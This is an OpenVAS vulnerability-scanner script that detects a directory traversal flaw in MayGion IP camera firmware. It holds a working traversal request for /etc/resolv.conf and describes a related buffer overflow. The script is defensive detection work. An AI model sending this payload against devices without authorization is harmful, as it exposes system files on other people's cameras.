###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_maygion_ipcamera_mult_vuln.nasl 29 2013-10-30 14:01:12Z veerendragg $
#
# MayGion IP Cameras Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803774";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 29 $");
  script_bugtraq_id(60192, 60196);
  script_cve_id("CVE-2013-1604", "CVE-2013-1605");
  script_tag(name:"cvss_base", value:"7.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-30 15:01:12 +0100 (Mi, 30. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-10-28 15:46:55 +0530 (Mon, 28 Oct 2013)");
  script_name("MayGion IP Cameras Multiple Vulnerabilities");

  tag_summary =
"This host is running MayGion IP Camera and is prone to multiple
vulnerabilities.";

  tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and check whether it
is able to read the sensitive information or not.";

  tag_insight =
"- The flaw is due to the program not properly sanitizing user input,
   specifically directory traversal style attacks (e.g., ../../).
 - User-supplied input is not properly validated when handling a specially
   crafted GET request. This may allow a remote attacker to cause a buffer
   overflow, resulting in a denial of service or potentially allowing the
   execution of arbitrary code.";

  tag_impact =
"Successful exploitation will allow remote attackers to gain access to
information or cause a buffer overflow, resulting in a denial of service
or potentially allowing the execution of arbitrary code.

Impact Level: System/Application";

  tag_affected =
"MayGion IP cameras firmware version 2011.27.09";

  tag_solution =
"Upgrade to H.264 ipcam firmware 2013.04.22 or later,
For updates refer to http://www.maygion.com ";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/93709");
  script_xref(name : "URL" , value : "http://osvdb.org/93708");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/May/194");
  script_xref(name : "URL" , value : "http://www.coresecurity.com/advisories/maygion-IP-cameras-multiple-vulnerabilities");
  script_summary("Check if MayGion IP camera is vulnerable to directory traversal");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
http_port = "";
req = "";
res = "";

## Get HTTP Port
http_port = get_http_port(default:80);
if(!http_port){
  http_port = 80;
}

## Check the port status
if(!get_port_state(http_port)){
  exit(0);
}

banner = get_http_banner(port:http_port);
if("Server: WebServer(IPCamera_Logo)" >!< banner){
  exit(0);
}

## Construct the attack request
req = 'GET /../../../../../../../../../etc/resolv.conf HTTP/1.1\r\n\r\n';
res = http_send_recv(port:http_port, data:req, bodyonly:FALSE);

## Check the response to confirm vulnerability
if(res =~ "HTTP/1.. 200 OK" && "nameserver" >< res &&
   "application/octet-stream" >< res)
{
  security_hole(port:http_port);
  exit(0);
}
